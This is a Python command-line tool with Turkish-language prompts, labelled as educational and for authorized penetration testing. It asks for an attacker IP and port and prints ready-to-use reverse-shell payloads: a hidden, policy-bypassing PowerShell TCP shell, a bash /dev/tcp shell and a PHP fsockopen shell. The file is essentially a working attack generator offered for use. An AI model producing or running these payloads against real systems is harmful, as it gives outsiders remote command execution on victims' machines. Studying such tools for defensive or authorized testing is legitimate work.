#!/usr/bin/env python3
"""
Interactive Payload Builder (Eğitim Amaçlı)
===========================================
Sızma testleri için hızlıca Reverse Shell komutları üretir.
"""
import os
import sys

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_windows(ip, port):
    print("\n[+] Windows PowerShell Reverse Shell:")
    payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    print("-" * 50)
    print(payload)
    print("-" * 50)

def generate_linux(ip, port):
    print("\n[+] Linux Bash Reverse Shell:")
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print("-" * 50)
    print(payload)
    print("-" * 50)

def generate_web(ip, port):
    print("\n[+] Web PHP Reverse Shell:")
    payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    print("-" * 50)
    print(payload)
    print("-" * 50)

def main():
    clear_screen()
    print("=" * 50)
    print("   🚀 INTERACTIVE PAYLOAD BUILDER v1.0   ")
    print("=" * 50)
    print("[!] Yalnızca eğitim ve yetkili testler içindir.\n")

    try:
        lhost = input("[?] LHOST (Saldırgan IP): ").strip()
        lport = input("[?] LPORT (Saldırgan Port): ").strip()

        if not lhost or not lport:
            print("[-] Hata: IP ve Port boş bırakılamaz.")
            sys.exit(1)

        while True:
            print("\n--- Hedef Sistem Seçimi ---")
            print("1) Windows (PowerShell)")
            print("2) Linux (Bash)")
            print("3) Web (PHP)")
            print("0) Çıkış")
            
            choice = input("\n[>] Seçiminiz (0-3): ").strip()

            if choice == '1':
                generate_windows(lhost, lport)
            elif choice == '2':
                generate_linux(lhost, lport)
            elif choice == '3':
                generate_web(lhost, lport)
            elif choice == '0':
                print("[*] Çıkış yapılıyor...")
                break
            else:
                print("[-] Geçersiz seçim, tekrar deneyin.")
                
    except KeyboardInterrupt:
        print("\n[*] İşlem iptal edildi.")
        sys.exit(0)

if __name__ == "__main__":
    main()
